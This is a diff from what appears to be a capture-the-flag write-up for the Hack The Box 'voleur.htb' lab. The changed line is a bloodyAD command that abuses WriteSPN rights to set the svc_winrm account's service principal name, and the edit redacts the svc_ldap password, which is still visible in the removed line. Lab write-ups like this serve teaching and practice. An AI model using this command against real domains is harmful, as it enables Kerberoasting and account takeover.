@@ -172,7 +172,7 @@ Having _WriteSPN_ permissions lets an attacker add or modify a Service Principal
 To carry out this attack, I begin by changing the _svc_winrm_ account's SPN to be an arbitrary value using [Bloody-AD](https://github.com/CravateRouge/bloodyAD).
 
 ```
-$ bloodyad -d voleur.htb -k -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' --host dc.voleur.htb set object svc_winrm servicePrincipalName -v HTTP/pwned
+$ bloodyad -d voleur.htb -k -u 'svc_ldap' -p '[REDACTED]' --host dc.voleur.htb set object svc_winrm servicePrincipalName -v HTTP/pwned
 [+] svc_winrm's servicePrincipalName has been updated
 ```
 
